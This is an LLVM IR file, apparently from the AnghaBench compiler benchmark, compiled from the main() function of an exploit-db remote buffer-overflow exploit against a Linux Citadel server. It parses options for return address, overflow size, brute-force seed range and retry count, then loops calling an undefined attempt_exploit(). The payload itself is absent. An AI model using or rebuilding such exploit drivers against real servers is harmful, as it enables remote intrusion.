; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_58.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_58.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [27 x i8] c"t:li:s:hr:a:A:o:O:b:B:n:S:\00", align 1
@ch = common dso_local global i32 0, align 4
@host = common dso_local global i8* null, align 8
@optarg = common dso_local global i32 0, align 4
@SIZ = common dso_local global i32 0, align 4
@magicNumber = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [27 x i8] c"[-] Using IPGM secret: %d\0A\00", align 1
@localNet = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [26 x i8] c"[-] Using local net hack\0A\00", align 1
@nanoSecondsToSleep = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [45 x i8] c"[-] Using sleep count of %d where necessary\0A\00", align 1
@retAddr = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [31 x i8] c"[-] Using RET address: 0x%08x\0A\00", align 1
@adjustRet = common dso_local global i32 0, align 4
@bufLenAdjust = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [44 x i8] c"[-] Increasing overflow buffer by %d bytes\0A\00", align 1
@.str.6 = private unnamed_addr constant [44 x i8] c"[-] Decreasing overflow buffer by %d bytes\0A\00", align 1
@SEED_START = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [38 x i8] c"[-] Bruteforce starting at srand(%d)\0A\00", align 1
@SEED_MAX = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [36 x i8] c"[-] Bruteforce ending at srand(%d)\0A\00", align 1
@NUM_ATTEMPTS = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [31 x i8] c"[-] Will try exploit %d times\0A\00", align 1
@RESPAWN_SLEEP = common dso_local global i8* null, align 8
@.str.10 = private unnamed_addr constant [56 x i8] c"[-] Will sleep for %d seconds between exploit attempts\0A\00", align 1
@retVal = common dso_local global i32 0, align 4
@SUCCESS = common dso_local global i32 0, align 4
@.str.11 = private unnamed_addr constant [45 x i8] c"[*] Couldn't connect to host: %s not found.\0A\00", align 1
@.str.12 = private unnamed_addr constant [29 x i8] c"[*] Couldn't grab a socket!\0A\00", align 1
@.str.13 = private unnamed_addr constant [35 x i8] c"[*] Connection to %s was rejected\0A\00", align 1
@.str.14 = private unnamed_addr constant [57 x i8] c"[!] WARNING: Failed to set TCP_NODELAY option on socket\0A\00", align 1
@.str.15 = private unnamed_addr constant [45 x i8] c"[*] Brute force operation failed. Aborting.\0A\00", align 1
@.str.16 = private unnamed_addr constant [28 x i8] c"[*] IPGM secret incorrect!\0A\00", align 1
@.str.17 = private unnamed_addr constant [67 x i8] c"[!] This attempt failed... waiting for INIT to respawn Citadel...\0A\00", align 1
@.str.18 = private unnamed_addr constant [32 x i8] c"[*] ERROR: There was no error!\0A\00", align 1
@.str.19 = private unnamed_addr constant [40 x i8] c"[-] Exploit failed %d times. Aborting.\0A\00", align 1
@.str.20 = private unnamed_addr constant [19 x i8] c"\0AHave a nice day!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  br label %7

7:                                                ; preds = %97, %2
  %8 = load i32, i32* %4, align 4
  %9 = load i8**, i8*** %5, align 8
  %10 = call i32 @getopt(i32 %8, i8** %9, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str, i64 0, i64 0))
  store i32 %10, i32* @ch, align 4
  %11 = icmp ne i32 %10, -1
  br i1 %11, label %12, label %98

12:                                               ; preds = %7
  %13 = load i32, i32* @ch, align 4
  switch i32 %13, label %94 [
    i32 116, label %14
    i32 105, label %20
    i32 108, label %26
    i32 115, label %28
    i32 114, label %34
    i32 97, label %39
    i32 65, label %48
    i32 111, label %57
    i32 79, label %63
    i32 98, label %71
    i32 66, label %77
    i32 110, label %83
    i32 83, label %89
    i32 104, label %93
  ]

14:                                               ; preds = %12
  %15 = load i8*, i8** @host, align 8
  %16 = load i32, i32* @optarg, align 4
  %17 = load i32, i32* @SIZ, align 4
  %18 = sub nsw i32 %17, 1
  %19 = call i32 @strncpy(i8* %15, i32 %16, i32 %18)
  br label %97

20:                                               ; preds = %12
  %21 = load i32, i32* @optarg, align 4
  %22 = call i8* @atoi(i32 %21)
  %23 = ptrtoint i8* %22 to i32
  store i32 %23, i32* @magicNumber, align 4
  %24 = load i32, i32* @magicNumber, align 4
  %25 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.1, i64 0, i64 0), i32 %24)
  br label %97

26:                                               ; preds = %12
  store i32 1, i32* @localNet, align 4
  %27 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.2, i64 0, i64 0))
  br label %97

28:                                               ; preds = %12
  %29 = load i32, i32* @optarg, align 4
  %30 = call i8* @atoi(i32 %29)
  %31 = ptrtoint i8* %30 to i32
  store i32 %31, i32* @nanoSecondsToSleep, align 4
  %32 = load i32, i32* @nanoSecondsToSleep, align 4
  %33 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.3, i64 0, i64 0), i32 %32)
  br label %97

34:                                               ; preds = %12
  %35 = load i32, i32* @optarg, align 4
  %36 = call i32 @strtoul(i32 %35, i32* null, i32 16)
  store i32 %36, i32* @retAddr, align 4
  %37 = load i32, i32* @retAddr, align 4
  %38 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.4, i64 0, i64 0), i32 %37)
  br label %97

39:                                               ; preds = %12
  %40 = load i32, i32* @optarg, align 4
  %41 = call i8* @atoi(i32 %40)
  %42 = ptrtoint i8* %41 to i32
  store i32 %42, i32* @adjustRet, align 4
  %43 = load i32, i32* @adjustRet, align 4
  %44 = load i32, i32* @retAddr, align 4
  %45 = add nsw i32 %44, %43
  store i32 %45, i32* @retAddr, align 4
  %46 = load i32, i32* @retAddr, align 4
  %47 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.4, i64 0, i64 0), i32 %46)
  br label %97

48:                                               ; preds = %12
  %49 = load i32, i32* @optarg, align 4
  %50 = call i8* @atoi(i32 %49)
  %51 = ptrtoint i8* %50 to i32
  store i32 %51, i32* @adjustRet, align 4
  %52 = load i32, i32* @adjustRet, align 4
  %53 = load i32, i32* @retAddr, align 4
  %54 = sub nsw i32 %53, %52
  store i32 %54, i32* @retAddr, align 4
  %55 = load i32, i32* @retAddr, align 4
  %56 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.4, i64 0, i64 0), i32 %55)
  br label %97

57:                                               ; preds = %12
  %58 = load i32, i32* @optarg, align 4
  %59 = call i8* @atoi(i32 %58)
  %60 = ptrtoint i8* %59 to i32
  store i32 %60, i32* @bufLenAdjust, align 4
  %61 = load i32, i32* @bufLenAdjust, align 4
  %62 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.5, i64 0, i64 0), i32 %61)
  br label %97

63:                                               ; preds = %12
  %64 = load i32, i32* @optarg, align 4
  %65 = call i8* @atoi(i32 %64)
  %66 = ptrtoint i8* %65 to i32
  store i32 %66, i32* @bufLenAdjust, align 4
  %67 = load i32, i32* @bufLenAdjust, align 4
  %68 = sub nsw i32 0, %67
  store i32 %68, i32* @bufLenAdjust, align 4
  %69 = load i32, i32* @bufLenAdjust, align 4
  %70 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.6, i64 0, i64 0), i32 %69)
  br label %97

71:                                               ; preds = %12
  %72 = load i32, i32* @optarg, align 4
  %73 = call i8* @atoi(i32 %72)
  %74 = ptrtoint i8* %73 to i32
  store i32 %74, i32* @SEED_START, align 4
  %75 = load i32, i32* @SEED_START, align 4
  %76 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.7, i64 0, i64 0), i32 %75)
  br label %97

77:                                               ; preds = %12
  %78 = load i32, i32* @optarg, align 4
  %79 = call i8* @atoi(i32 %78)
  %80 = ptrtoint i8* %79 to i32
  store i32 %80, i32* @SEED_MAX, align 4
  %81 = load i32, i32* @SEED_MAX, align 4
  %82 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.8, i64 0, i64 0), i32 %81)
  br label %97

83:                                               ; preds = %12
  %84 = load i32, i32* @optarg, align 4
  %85 = call i8* @atoi(i32 %84)
  %86 = ptrtoint i8* %85 to i32
  store i32 %86, i32* @NUM_ATTEMPTS, align 4
  %87 = load i32, i32* @NUM_ATTEMPTS, align 4
  %88 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.9, i64 0, i64 0), i32 %87)
  br label %97

89:                                               ; preds = %12
  %90 = load i32, i32* @optarg, align 4
  %91 = call i8* @atoi(i32 %90)
  store i8* %91, i8** @RESPAWN_SLEEP, align 8
  %92 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.10, i64 0, i64 0))
  br label %97

93:                                               ; preds = %12
  br label %94

94:                                               ; preds = %12, %93
  %95 = call i32 (...) @usage()
  %96 = call i32 @exit(i32 0) #3
  unreachable

97:                                               ; preds = %89, %83, %77, %71, %63, %57, %48, %39, %34, %28, %26, %20, %14
  br label %7

98:                                               ; preds = %7
  br label %99

99:                                               ; preds = %137, %98
  %100 = load i32, i32* %6, align 4
  %101 = add nsw i32 %100, 1
  store i32 %101, i32* %6, align 4
  %102 = load i32, i32* @NUM_ATTEMPTS, align 4
  %103 = icmp slt i32 %100, %102
  br i1 %103, label %104, label %108

104:                                              ; preds = %99
  %105 = call i32 (...) @attempt_exploit()
  store i32 %105, i32* @retVal, align 4
  %106 = load i32, i32* @SUCCESS, align 4
  %107 = icmp ne i32 %105, %106
  br label %108

108:                                              ; preds = %104, %99
  %109 = phi i1 [ false, %99 ], [ %107, %104 ]
  br i1 %109, label %110, label %138

110:                                              ; preds = %108
  %111 = load i32, i32* @retVal, align 4
  switch i32 %111, label %135 [
    i32 132, label %112
    i32 128, label %116
    i32 133, label %119
    i32 130, label %123
    i32 134, label %125
    i32 131, label %128
    i32 129, label %131
  ]

112:                                              ; preds = %110
  %113 = load i8*, i8** @host, align 8
  %114 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.11, i64 0, i64 0), i8* %113)
  %115 = call i32 @exit(i32 1) #3
  unreachable

116:                                              ; preds = %110
  %117 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.12, i64 0, i64 0))
  %118 = call i32 @exit(i32 1) #3
  unreachable

119:                                              ; preds = %110
  %120 = load i8*, i8** @host, align 8
  %121 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.13, i64 0, i64 0), i8* %120)
  %122 = call i32 @exit(i32 1) #3
  unreachable

123:                                              ; preds = %110
  %124 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.14, i64 0, i64 0))
  br label %137

125:                                              ; preds = %110
  %126 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.15, i64 0, i64 0))
  %127 = call i32 @exit(i32 1) #3
  unreachable

128:                                              ; preds = %110
  %129 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.16, i64 0, i64 0))
  %130 = call i32 @exit(i32 1) #3
  unreachable

131:                                              ; preds = %110
  %132 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.17, i64 0, i64 0))
  %133 = load i8*, i8** @RESPAWN_SLEEP, align 8
  %134 = call i32 @sleep(i8* %133)
  br label %137

135:                                              ; preds = %110
  %136 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.18, i64 0, i64 0))
  br label %137

137:                                              ; preds = %135, %131, %123
  br label %99

138:                                              ; preds = %108
  %139 = load i32, i32* %6, align 4
  %140 = load i32, i32* @NUM_ATTEMPTS, align 4
  %141 = icmp eq i32 %139, %140
  br i1 %141, label %142, label %145

142:                                              ; preds = %138
  %143 = load i32, i32* %6, align 4
  %144 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.19, i64 0, i64 0), i32 %143)
  br label %145

145:                                              ; preds = %142, %138
  %146 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.20, i64 0, i64 0))
  %147 = call i32 @exit(i32 0) #3
  unreachable
}

declare dso_local i32 @getopt(i32, i8**, i8*) #1

declare dso_local i32 @strncpy(i8*, i32, i32) #1

declare dso_local i8* @atoi(i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @strtoul(i32, i32*, i32) #1

declare dso_local i32 @usage(...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @attempt_exploit(...) #1

declare dso_local i32 @sleep(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
